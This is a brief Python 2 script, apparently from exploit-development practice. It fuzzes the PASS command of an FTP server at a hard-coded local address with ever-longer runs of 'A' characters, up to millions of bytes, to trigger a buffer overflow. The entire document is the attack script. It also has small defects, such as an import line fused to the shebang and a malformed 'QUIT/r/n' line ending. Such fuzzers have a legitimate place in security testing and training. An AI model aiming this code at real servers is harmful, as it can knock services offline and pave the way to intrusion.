#!/usr/bin/python import socket

import socket

buffer=["AAAAAAAA"]
contador=10000
while len(buffer) <1000:
	buffer.append("A"*contador)
	contador=contador+3000
	
for string in buffer:
	print "Fuzzing em PASS com %s bytes" %string
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(("192.168.0.17",21))
	s.recv(1024)
	s.send('USER dennao \r\n')
	s.recv(1024)
	s.send('PASS '+string+'\r\n')
	s.send('QUIT/r/n')